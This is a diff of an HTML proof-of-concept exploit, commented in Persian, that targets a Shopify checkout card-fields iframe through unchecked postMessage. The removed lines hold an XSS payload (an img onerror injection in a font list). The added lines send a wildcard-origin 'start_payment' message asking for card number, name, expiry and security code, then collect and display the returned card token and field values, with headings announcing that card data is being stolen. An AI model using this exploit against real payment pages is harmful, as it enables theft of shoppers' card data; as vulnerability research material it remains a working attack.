@@ -1,26 +1,69 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>XSS via postMessage</title>
+    <meta charset="UTF-8">
+    <title>PoC - Shopify Card Fields Data Leak via postMessage</title>
 </head>
 <body>
-    <iframe id="victim" src="https://checkout.us.shopifycs.com/verification_value?identifier=4a94b55cf88c409b43b2cc6b16ec1869&dir=ltr"></iframe>
+    <h1 style="color:red;">اطلاعات کارت در حال سرقت ...</h1>
+    <p>لطفا منتظر بمانید تا صفحه‌ی پرداخت لود شود و سپس داده‌ها دریافت می‌شوند.</p>
+
+    <!-- صفحه‌ی هدف (همان asset سفید) را در iframe قرار می‌دهیم -->
+    <iframe id="victim" src="https://checkout.us.shopifycs.com/verification_value?identifier=4a94b55cf88c409b43b2cc6b16ec1869&dir=ltr" style="width:600px;height:300px;border:1px solid #000;"></iframe>
+
     <script>
-        var iframe = document.getElementById('victim');
+        // 1. صبر می‌کنیم تا iframe کاملاً لود شود (چون اسکریپت داخل iframe باید راه‌اندازی شود)
+        window.onload = function() {
+            var iframe = document.getElementById('victim');
 
-        iframe.onload = function() {
-         
-            var payload = {
-                action: "load_fonts",
-                fonts: {
-                    google: ["\"><img src=x onerror=alert('XSS via postMessage: ' + document.domain)>"]
+            // 2. با یک تاخیر 3 ثانیه‌ای پیام را می‌فرستیم تا مطمئن شویم iframe آماده‌ی دریافت پیام است
+            setTimeout(function() {
+
+                // **این همان درخواستی است که کد JS گوش می‌دهد**
+                // در کد اصلی، اکشن "start_payment" باعث می‌شود که همه‌ی فیلدها جمع‌آوری و ارسال شوند.
+                var payload = {
+                    action: "start_payment",
+                    requestId: "hack_" + Date.now(),
+                    fields: ["number", "name", "expiry", "verification_value", "issue_date", "issue_number"],
+                    defaultCardData: {} // خالی بگذارید تا داده‌های واقعی کاربر برگردد
+                };
+
+                // پیام باید با پیشوند "cardfields:" شروع شود (طبق قانون کد)
+                var msg = 'cardfields:' + JSON.stringify(payload);
+
+                console.log("[*] Sending postMessage:", msg);
+
+                // **ارسال به همه‌ی دامنه‌ها (بدون بررسی Origin)**
+                iframe.contentWindow.postMessage(msg, '*');
+
+            }, 3000);
+
+            // 3. گوش دادن به پاسخ‌های ارسال‌شده از iframe (که حاوی اطلاعات کارت است)
+            window.addEventListener('message', function(event) {
+                // فیلتر کنیم که حتماً مربوط به همان صفحه باشد (اختیاری)
+                if (event.data && typeof event.data === 'string' && event.data.startsWith('cardfields:')) {
+                    try {
+                        var jsonData = JSON.parse(event.data.substring(11));
+                        console.log("[+] Data received from iframe:", jsonData);
+
+                        // اگر پاسخ شامل توکن یا اطلاعات کارت بود، آن را نمایش بده
+                        if (jsonData.token) {
+                            alert('❗ توکن کارت به سرقت رفت:\n' + jsonData.token);
+                        } else if (jsonData.field && jsonData.field.values) {
+                            var values = jsonData.field.values;
+                            var msg = '❗ اطلاعات فیلدها:\n';
+                            values.forEach(function(item) {
+                                msg += item.name + ': ' + item.value + '\n';
+                            });
+                            alert(msg);
+                        } else {
+                            alert('📩 داده‌های دریافت‌شده:\n' + JSON.stringify(jsonData, null, 2));
+                        }
+                    } catch (e) {
+                        console.warn("خطا در parsing پاسخ:", e);
+                    }
                 }
-            };
-
-            
-            var msg = 'cardfields:' + JSON.stringify(payload);
-
-            iframe.contentWindow.postMessage(msg, '*');
+            });
         };
     </script>
 </body>
